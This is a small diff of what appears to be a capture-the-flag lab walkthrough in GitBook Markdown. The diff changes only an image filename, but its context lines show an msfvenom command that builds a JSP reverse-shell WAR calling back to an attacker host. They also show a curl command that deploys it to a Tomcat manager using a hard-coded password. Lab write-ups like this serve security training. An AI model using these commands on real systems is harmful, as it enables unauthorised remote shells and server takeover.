@@ -29,7 +29,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.9 LPORT=4444 -f war -o rev
 curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/mnager/text/deploy?path=/shell --upload-file rev.war
 ```
 
-<figure><img src="../../../.gitbook/assets/image (15) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
